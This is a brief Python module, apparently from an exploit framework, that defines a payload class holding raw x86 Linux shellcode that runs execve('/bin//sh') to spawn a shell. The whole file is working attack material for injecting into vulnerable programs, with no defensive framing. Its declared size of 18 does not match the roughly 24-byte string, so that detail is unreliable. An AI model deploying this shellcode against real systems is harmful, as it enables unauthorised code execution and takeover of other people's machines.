from payload_model import Payload


class Shellcode(Payload):
    def __init__(self):
        shellcode = b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
        size = 18
        use_metaploit = False
        info_metasploit = ""
        super(Shellcode, self).__init__(shellcode, size, use_metaploit, info_metasploit, "x86", True, False)
